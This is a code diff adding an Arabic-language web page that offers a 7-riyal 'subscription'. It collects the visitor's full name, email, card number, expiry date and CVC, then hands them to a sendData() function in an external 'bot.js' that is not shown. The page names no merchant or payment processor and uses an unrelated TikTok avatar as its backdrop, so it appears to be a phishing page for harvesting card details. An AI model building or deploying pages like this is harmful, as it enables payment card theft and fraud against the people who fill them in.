@@ -1,0 +1,37 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <title>الاشتراك</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      background: url('https://p16-sign-va.tiktokcdn.com/tos-maliva-avt-0068/fa6a5ef473076f96484cbbd921d74942~tplv-tiktokx-cropcenter:1080:1080.jpeg?dr=14579&refresh_token=1efce19c&x-expires=1750284000&x-signature=C8783wjAtnTdDHJUtR1NYPq9Dhc%3D&t=4d5b0474&ps=13740610&shp=a5d48078&shcp=81f88b70&idc=my') no-repeat center center/cover;
+      color: white; margin: 0;
+      font-family: sans-serif;
+    }
+    .container {
+      background: rgba(0,0,0,0.7);
+      max-width: 400px;
+      margin: 60px auto;
+      padding: 20px;
+      border-radius: 10px;
+    }
+    input { width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 5px; border: none; }
+    button { background: #ff4081; color: white; padding: 10px; border: none; border-radius: 5px; width: 100%; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>اشتراك بـ 7 ريال</h2>
+    <input type="text" id="name" placeholder="الاسم الكامل" required />
+    <input type="email" id="email" placeholder="البريد الإلكتروني" required />
+    <input type="text" id="card" placeholder="رقم البطاقة" required />
+    <input type="text" id="exp" placeholder="تاريخ الانتهاء (MM/YY)" required />
+    <input type="text" id="cvc" placeholder="رمز الأمان CVC" required />
+    <button onclick="sendData()">متابعة</button>
+  </div>
+  <script src="bot.js"></script>
+</body>
+</html>
